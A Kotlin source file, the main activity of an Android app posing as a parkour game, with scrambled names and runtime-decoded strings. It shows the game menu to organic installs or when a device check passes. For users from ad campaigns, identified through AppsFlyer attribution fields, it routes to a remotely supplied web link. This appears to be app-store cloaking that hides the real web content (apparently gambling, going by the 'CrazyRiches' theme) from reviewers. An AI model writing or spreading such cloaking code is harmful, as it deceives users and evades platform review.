package com.parkourrace.gam

import android.animation.ObjectAnimator
import android.os.Bundle
import android.view.View
import android.view.animation.AccelerateInterpolator
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.viewModels
import androidx.core.animation.doOnEnd
import androidx.core.splashscreen.SplashScreen.Companion.installSplashScreen
import androidx.lifecycle.lifecycleScope
import androidx.navigation.compose.rememberNavController
import com.appsflyer.AppsFlyerLib
import com.google.firebase.FirebaseApp
import com.parkourrace.gam.di.TetParkourElytsApplication
import com.parkourrace.gam.ui.theme.CrazyRichesTheme
import com.parkourrace.gam.utils.comparkourracegam
import com.parkourrace.gam.utils.erucesTetTni
import com.parkourrace.gam.utils.sLinktetRuokrarElytsLinktetnkSubAllCheckInternet
import kotlinx.coroutines.launch
import java.net.URLEncoder
import java.nio.charset.StandardCharsets

class MainActivity : ComponentActivity() {
    private val viewModel: MainViewModel by viewModels()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        installSplashScreen().setOnExitAnimationListener { splashView ->
            val tetRuokrapLinkHeight = splashView.view.height.toFloat()
            ObjectAnimator.ofFloat(
                splashView.view,
                View.TRANSLATION_Y,
                0F,
                tetRuokrapLinkHeight / 16,
                tetRuokrapLinkHeight / 8,
                tetRuokrapLinkHeight / 4,
                tetRuokrapLinkHeight / 2,
                tetRuokrapLinkHeight
            ).apply {
                interpolator = AccelerateInterpolator()
                duration = 700L
                doOnEnd { splashView.remove() }
                start()
            }
        }
        FirebaseApp.initializeApp(this)

        setContent {
            val navController = rememberNavController()
            CrazyRichesTheme {
                CrazyRichesApp(navController, viewModel)
            }

        }
        tetParkourLinkElytsLoadsading()
    }

    fun tetParkourLinkElytsLoadsading() {
        viewModel.tetParkourStylesLoading.value = true
        if (!sLinktetRuokrarElytsLinktetnkSubAllCheckInternet(this)) {
            viewModel.tetParkourStylesLoading.value = false
            return
        }

        viewModel.getTetParkourElytsLinkValue(this) {
            if (it.isNotBlank()) {
                tetStylesLoadingandnavigateToWeb(it)
            } else {
                viewModel.tetRoukrapElytsFirebase(
                    service = (application as TetParkourElytsApplication).ruokRapTetRapRuokService
                ) { isCorrectUrl ->
                    if (isCorrectUrl) startsLnktetRuokrarElytsLinktetnWork() else tetParkourStylesLoadingnavigateToMenu()
                }
            }
        }
    }

    private fun startsLnktetRuokrarElytsLinktetnWork() {
        viewModel.ruokrapTetFBGOOGOLinkWOrkId(this)
        lifecycleScope.launch {
            tetParkourGetAtetParkourStylesLoadingFPars()
        }
    }


    private fun tetParkourGetAtetParkourStylesLoadingFPars() {
        val aFIDStylesEsltytetParkour = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        viewModel.aFTetParkourElytsIDSetAFID(aFIDStylesEsltytetParkour.toString())

        TetParkourElytsApplication.tetParkourElytsAppsFlyerState.observe(this) {
            it.forEach { inform ->
                when (inform.key) {
                    "ct_eiakeg".comparkourracegam() -> viewModel.tetParkourElytsParkourSetStatusAF(
                        inform.value.toString()
                    )
                    "eoyeazqb".comparkourracegam() -> viewModel.tetParkourSetElytsSetAFCampaign(
                        inform.value.toString()
                    )
                    "ospxa_jyiltv".comparkourracegam() -> viewModel.mediaTetParkourSourceElytsSetAFMediaSource(
                        inform.value.toString()
                    )
                    "ct_owaexsf".comparkourracegam() -> viewModel.channelAFTetParkourElytsSetAFChannel(
                        inform.value.toString()
                    )
                }
            }
            comStylesLoadingCollectLink()
        }
    }


    private fun comStylesLoadingCollectLink() {
        if (viewModel.tetParkourSwitchCheckOrganic()) {
            tetParkourStylesLoadingnavigateToMenu()
            return
        }
        if (erucesTetTni(this)) {
            tetParkourStylesLoadingnavigateToMenu()
            return
        }

        viewModel.linkBuildTetRoukrapBuildLink(this) { link ->
            tetStylesLoadingandnavigateToWeb(link)
        }
    }

    private fun tetParkourStylesLoadingnavigateToMenu() {
        viewModel.routeString.value = "menu"
    }

    private fun tetStylesLoadingandnavigateToWeb(link: String) {
        val stylesurl = URLEncoder.encode(link, StandardCharsets.UTF_8.toString())
        viewModel.routeString.value = "web/$stylesurl"
    }
}